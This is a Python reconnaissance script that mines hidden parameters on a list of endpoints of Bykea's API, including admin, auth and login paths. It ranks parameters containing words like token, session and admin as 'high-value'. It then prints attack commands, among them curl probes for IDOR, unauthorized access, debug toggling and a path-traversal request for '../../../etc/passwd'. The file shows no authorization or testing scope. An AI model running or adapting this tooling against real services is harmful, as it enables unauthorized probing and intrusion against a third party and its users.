#!/usr/bin/env python3
"""
🔍 PARAMETER MINING RUNNER
Advanced parameter discovery on Bykea API endpoints using PortSwigger techniques
"""

import asyncio
import aiohttp
import logging
import sys
import os

# Add the project root to Python path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from modules.advanced_param_miner import AdvancedParamMiner
from asset_manager import AssetManager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

async def mine_bykea_parameters():
    """Run advanced parameter mining on Bykea API endpoints."""

    # Initialize components
    asset_manager = AssetManager()
    config = {}
    param_miner = AdvancedParamMiner(asset_manager, config)

    # Target Bykea API endpoints
    targets = [
        'https://api.bykea.net',
        'https://api.bykea.net/api',
        'https://api.bykea.net/health',
        'https://api.bykea.net/v1',
        'https://api.bykea.net/v2',
        'https://api.bykea.net/auth',
        'https://api.bykea.net/login',
        'https://api.bykea.net/user',
        'https://api.bykea.net/users',
        'https://api.bykea.net/admin'
    ]

    logger.info(f"🔍 Starting parameter mining on {len(targets)} Bykea endpoints")

    all_found_params = {}

    async with aiohttp.ClientSession() as session:
        for target in targets:
            try:
                logger.info(f"🔍 Mining parameters for: {target}")

                # Run comprehensive parameter mining
                results = await param_miner.mine_parameters(target, session)

                if any(results.values()):
                    logger.info(f"✅ Found parameters on {target}:")

                    all_found_params[target] = results

                    for param_type, params in results.items():
                        if params:
                            logger.info(f"  📋 {param_type}: {', '.join(params[:10])}")  # Show first 10
                            if len(params) > 10:
                                logger.info(f"      ... and {len(params) - 10} more")
                else:
                    logger.info(f"❌ No parameters found on {target}")

            except Exception as e:
                logger.error(f"❌ Parameter mining failed for {target}: {e}")

    # Summary report
    logger.info(f"\n🔍 PARAMETER MINING SUMMARY:")

    total_params = 0
    high_value_findings = []

    for target, results in all_found_params.items():
        target_param_count = sum(len(params) for params in results.values())
        total_params += target_param_count

        if target_param_count > 0:
            logger.info(f"✅ {target}: {target_param_count} parameters")

            # Identify high-value parameters
            high_value_keywords = ['id', 'user', 'admin', 'auth', 'token', 'key', 'session', 'debug']

            for param_type, params in results.items():
                for param in params:
                    if any(keyword in param.lower() for keyword in high_value_keywords):
                        high_value_findings.append(f"{target}?{param}=")

    logger.info(f"\n🎯 HIGH-VALUE PARAMETERS FOR TESTING:")
    if high_value_findings:
        for i, finding in enumerate(high_value_findings[:15], 1):  # Top 15
            logger.info(f"{i}. {finding}")

        # Generate test commands
        logger.info(f"\n🧪 SUGGESTED MANUAL TESTS:")
        for finding in high_value_findings[:5]:  # Top 5 for manual testing
            if '?id=' in finding:
                logger.info(f"curl '{finding}1' # Test IDOR")
                logger.info(f"curl '{finding}../../../etc/passwd' # Test LFI")
            elif any(keyword in finding.lower() for keyword in ['user', 'admin']):
                logger.info(f"curl '{finding}1' # Test unauthorized access")
            elif any(keyword in finding.lower() for keyword in ['debug', 'test']):
                logger.info(f"curl '{finding}true' # Test debug mode")
    else:
        logger.info("No high-value parameters found")

    logger.info(f"\nTotal parameters discovered: {total_params}")
    return all_found_params

if __name__ == "__main__":
    try:
        results = asyncio.run(mine_bykea_parameters())

        if results:
            print(f"\n✅ Parameter mining complete! Found parameters on {len(results)} endpoints")
        else:
            print(f"\n⚠️ No parameters discovered - API may be well-protected")

    except Exception as e:
        print(f"❌ Parameter mining failed: {e}")
        import traceback
        traceback.print_exc()